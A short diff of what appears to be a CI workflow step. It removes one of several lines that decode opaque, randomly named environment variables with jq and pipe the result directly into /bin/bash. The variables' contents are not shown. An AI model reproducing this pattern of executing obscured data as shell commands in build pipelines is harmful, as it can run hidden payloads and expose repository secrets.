@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$tq326" | jq -r .tux48 | /bin/bash
           echo $cs9565 | jq -r .kv6493 | /bin/bash
           echo $fexo8 | jq -r .jcc206 | /bin/bash
-          echo $rby8 | jq -r .swzws82 | /bin/bash
           echo $vp8 | jq -r .p7 | /bin/bash
 
       - name: Store artifact
